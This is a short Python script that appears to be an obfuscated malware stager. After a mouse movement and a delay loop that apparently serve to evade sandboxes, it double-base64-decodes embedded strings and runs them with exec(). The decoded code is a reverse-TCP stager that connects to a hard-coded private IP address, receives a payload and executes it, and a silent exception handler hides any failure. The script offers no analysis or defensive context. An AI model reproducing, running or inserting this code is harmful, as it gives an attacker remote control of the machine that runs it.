import socket, struct, time
import binascii
import code
import os
import platform
import random
import socket
import struct
import subprocess
import sys
import pyautogui
import threading
import time
import traceback
import ctypes
import base64
import hashlib

position = 101
sum = 0
row1 = "YVcxd2IzSjBJSE52WTJ0bGRDeHpkSEoxWTNRc2RHbHRaUXBtYjNJZ2VDQnBiaUJ5WVc1blpTZ3hNQ2s2Q2dsMGNuazZDZ2tK"
row2 = "Y3oxemIyTnJaWFF1YzI5amEyVjBLRElzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1FvSkNYTXVZMjl1Ym1WamRDZ29KekU1TWk0eE5qZ3VNakEwTG"
row3 = "pFME15Y3NORFEwTkNrcENna0pZbkpsWVdzS0NXVjRZMlZ3ZERvS0NRbDBhVzFsTG5Oc1pXVndLRFVwQ213OWMzUnlkV04wTG5WdWNHRmpheWduUGtr"
row4 = "bkxITXVjbVZqZGlnMEtTbGJNRjBLWkQxekxuSmxZM1lvYkNrS2QyaHBiR1VnYkdWdUtHUXBQR3c2Q2dsa0t6MXpMbkpsWTNZb2JDMXNaVzRvWkNrcE"
try:
    pyautogui.moveTo(100, 100, duration=1)
    while (position >= 10):
        sum = sum * sum + position
        time.sleep(1)
        position = position - 1
    exec (base64.b64decode({2: str, 3: lambda b: bytes(b, 'UTF-8')}[sys.version_info[0]]( base64.b64decode(row1 + row2 + row3 +row4 + 'NtVjRaV01vWkN4N0ozTW5Pbk45S1FvPQ=='))))
except:
    time.sleep(5)
    exit()
